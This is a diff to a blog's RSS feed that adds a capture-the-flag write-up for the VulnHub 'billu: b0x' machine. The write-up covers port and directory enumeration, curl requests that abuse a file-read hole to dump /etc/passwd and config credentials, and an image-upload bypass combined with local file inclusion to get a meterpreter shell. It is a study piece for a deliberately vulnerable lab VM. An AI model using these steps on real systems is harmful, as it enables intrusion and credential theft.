@@ -6,9 +6,150 @@
 </description>
     <link>http://a.aronott.com/</link>
     <atom:link href="http://a.aronott.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 29 Jul 2017 20:47:39 -0600</pubDate>
-    <lastBuildDate>Sat, 29 Jul 2017 20:47:39 -0600</lastBuildDate>
+    <pubDate>Fri, 20 Jul 2018 12:05:37 -0600</pubDate>
+    <lastBuildDate>Fri, 20 Jul 2018 12:05:37 -0600</lastBuildDate>
     <generator>Jekyll v3.5.1</generator>
+    
+      <item>
+        <title>billu: b0x</title>
+        <description>&lt;p&gt;billu: b0x is a boot-to-root vulnerable machine found on &lt;a href=&quot;https://www.vulnhub.com/entry/billu-b0x,188/&quot;&gt;VulnHub&lt;/a&gt;. I pulled this down and ran it in Virtualbox.&lt;/p&gt;
+
+&lt;p&gt;Starting with an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; we see there aren’t many options to attack this box, but
+it does lead well to practice with enumeration.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p- 192.168.1.147
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 15:00 EDT
+Nmap scan report for indishell.hsd1.co.comcast.net (192.168.1.147)
+Host is up (0.00013s latency).
+Not shown: 65533 closed ports
+PORT &amp;amp;nbsp; STATE SERVICE
+22/tcp open &amp;amp;nbsp;ssh
+80/tcp open &amp;amp;nbsp;http
+MAC Address: 08:00:27:1C:31:B1 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;[[image of nmap]]&lt;/p&gt;
+
+&lt;p&gt;Let’s start by enumerating&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://192.168.1.147 -w /usr/share/SecLists/Discovery/Web_Content/raft-large-directories.txt -e
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.1.147/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/SecLists/Discovery/Web_Content/raft-large-directories.txt
+[+] Status codes : 301,302,307,200,204
+[+] Expanded     : true
+=====================================================
+http://192.168.1.147/images (Status: 301)
+http://192.168.1.147/add (Status: 200)
+http://192.168.1.147/test (Status: 200)
+http://192.168.1.147/c (Status: 200)
+http://192.168.1.147/index (Status: 200)
+http://192.168.1.147/panel (Status: 302)
+http://192.168.1.147/in (Status: 200)
+http://192.168.1.147/show (Status: 200)
+http://192.168.1.147/uploaded_images (Status: 301)
+http://192.168.1.147/head (Status: 200)
+http://192.168.1.147/phpmy (Status: 301)
+=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;_&lt;/p&gt;
+
+&lt;p&gt;Looking at the test.php file, we find that it is looking for a &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; parameter.
+I tried passing this a GET request but that didn’t work so tested out with
+a POST.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -XPOST -d&quot;file=/etc/passwd&quot; http://192.168.1.147/test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Looking at the phpmy, I found that it’s phpmyadmin. That has some good
+information in the config file.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -XPOST -d&quot;file=/var/www/phpmy/config.inc.php&quot; http://192.168.1.147/test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The important piece is related to the username and password that is in the
+phpmyadmin configuration file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['password'] = 'roottoor';&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I tried these credentials in the phpmyadmin login but they didn’t work.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Shortcut&lt;/strong&gt;
+I found that I could ssh to the machine using root and the above password and
+finish this machine, however figured I’d continue looking for a different way.&lt;/p&gt;
+
+&lt;p&gt;Using the curl script, I decided to look through the index.php file and
+associated included files until I found the c.php file&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -XPOST -d&quot;file=/var/www/c.php&quot; http://192.168.1.147/test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This gives us the mysql connection string used by the login page.&lt;/p&gt;
+
+&lt;p&gt;Using these credentials, (billu:b0x_billu) we are able to get into phpmyadmin.
+_&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The auth table looks promising for information. Here we find another
+username/password combination (passwords stored in plain text are good for
+hackers)&lt;/p&gt;
+
+&lt;p&gt;biLLu:hEx_it&lt;/p&gt;
+
+&lt;p&gt;_&lt;/p&gt;
+
+&lt;p&gt;Using this combination I was able to login to the application itself where there
+is an option to add users. This form includes a file upload section, however
+it’s limited to jpg, gif, and png.&lt;/p&gt;
+
+&lt;p&gt;Through other enumeration, I was able to find a file include vulnerability in
+the panel.php file so perhaps I could upload something through this image upload
+and have it get included in this local file inclusion vulnerability.&lt;/p&gt;
+
+&lt;p&gt;I can’t remember where I found this trick but you can start a file with a given
+character set to make the file meta data look like a jpg file.&lt;/p&gt;
+
+&lt;p&gt;https://github.com/aaronott/SecBucket/tree/master/images&lt;/p&gt;
+
+&lt;p&gt;Using this file, I was able to add php to the end of this file and get it
+executed using the local file include vulnerability.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I was then able to bypass the filetype filtering in the php. On my attacking
+machine I created a meterpreter listener.&lt;/p&gt;
+
+&lt;p&gt;Calling the panel page using the &lt;code class=&quot;highlighter-rouge&quot;&gt;load&lt;/code&gt; parameter for the include, I was able to
+get the uploaded image to execute.&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 15 Aug 2017 12:34:00 -0600</pubDate>
+        <link>http://a.aronott.com/ctf/billu_box.html</link>
+        <guid isPermaLink="true">http://a.aronott.com/ctf/billu_box.html</guid>
+        
+        
+        <category>ctf</category>
+        
+      </item>
     
       <item>
         <title>Vulnix</title>
